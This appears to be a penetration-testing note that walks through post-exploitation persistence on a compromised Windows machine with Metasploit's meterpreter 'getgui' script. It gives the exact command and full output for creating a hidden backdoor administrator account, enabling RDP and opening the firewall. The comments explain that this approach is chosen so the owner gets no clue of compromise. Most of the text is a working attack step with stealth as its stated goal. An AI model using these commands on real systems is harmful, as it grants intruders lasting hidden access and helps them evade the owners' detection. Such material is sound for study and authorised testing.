

****************************************************************************************************************************

# Since Changing Administrator user password is not recommended as it can directly give him clue of compromise.

# So we will be creating a New backdoor user Account and we have the permission to do so as we are administrator

# We will then enable the rdp service if its disabled

# We will then also hider user from windows login screen, because when we restart system then the users appear on login page

# Then add the user to gruops Remote Desktop Users and Administrators

We can do all of this by a meterpreter command `getgui`

meterpreter > `run getgui -e -u user123 -p hacker_123321`

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: user123 with Password: hacker_123321
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: user123 to local group 'Remote Desktop Users'
[*] 	Adding User: user123 to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20240115.5318.rc
meterpreter > 
